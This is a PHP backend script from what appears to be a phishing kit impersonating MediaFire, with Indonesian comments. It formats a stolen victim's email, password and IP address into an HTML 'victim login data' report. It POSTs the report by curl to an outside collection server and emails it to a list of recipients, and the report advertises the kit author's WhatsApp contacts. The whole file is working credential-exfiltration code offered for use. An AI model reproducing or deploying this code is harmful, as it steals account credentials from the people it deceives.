<<?php

//mencegah masuk tanpa method get
if($email == "" && $total == ""){
$url = $_SERVER['PHP_SELF'];
header("Location: send.php");
}

//jenis ress
$coda = 'WEB GARID-NESIA ||';
$spin = 'WEB GARID-NESIA ||';
$claim = 'WEB GARID-NESIA ||';

//jenis mail
$coda_mail = 'coda';
$spin_mail = 'spin';
$claim_mail = 'claim';

//get setting
include 'setting.php';

//method get
$total = '1';

//mengambil random isian
include 'log-cpr.php';
include 'log-ip.php';
$noperess = '08'.rand(1000000,9999999999);

$log=array("Facebook", "VK");
$random_log=array_rand($log,2);

//info sendmail
$emailku = $email;
$logress = $log[$random_log[0]];
$idress = rand(100000000,9999999999);
$subjek = "☠️ | My Ressult - [ fumma - ID ] |Punya $email | Result MediaFire";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
	 <img src="https://i.ibb.co.com/YhLbRNc/IMG-20241219-WA0004.jpg" style="width: 100%; display: block; margin: auto;">
			
	 <div style="background: #339999; width: 294; color: #fff; text-align: center; padding: 10px;">★ Created TT Fumma - ID ★</div>
	 
			<table class="tblResult">
<tr>
					<th style="text-align: center;" colspan="3"> 𝐃𝐚𝐭𝐚 𝐋𝐨𝐠𝐢𝐧 𝐊𝐨𝐫𝐛𝐚𝐧 </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
			    <tr>
			        <td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ipress</td>
				</tr>			
				<tr>
					<th style="text-align: center;" colspan="3">© KhaaHost-25</th>
				</tr>
			</table>
		<div style="background: #000; width: 294; color: #33ffcc; text-align: center; padding: 10px;"><b>𝐅𝐢𝐧𝐝 𝐌𝐞 𝐎𝐧 : <br>𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 <a href="https://Wa.me/6283870159016"><b>Klik Disini</b></a>
								<br> Panel Jasteb Free  <a href="https://chat.whatsapp.com/HKAGIV3BrX73uMn1eyn2fc"><b>Klik Disini</b></a> </div> 
							
                                <table style="border-collapse: collapse; border-color: #000; background: #ccc" width="100%" border="1">
		</div>
	</body>
	</html>
EOD;
				
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";

$url = "https://mediafire1.my.id/pusat/apiii.php";
$data =
"subjek=".$subjek.
"&pesan=".$pesan;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $url);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);

$read = file_get_contents('yns/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
?>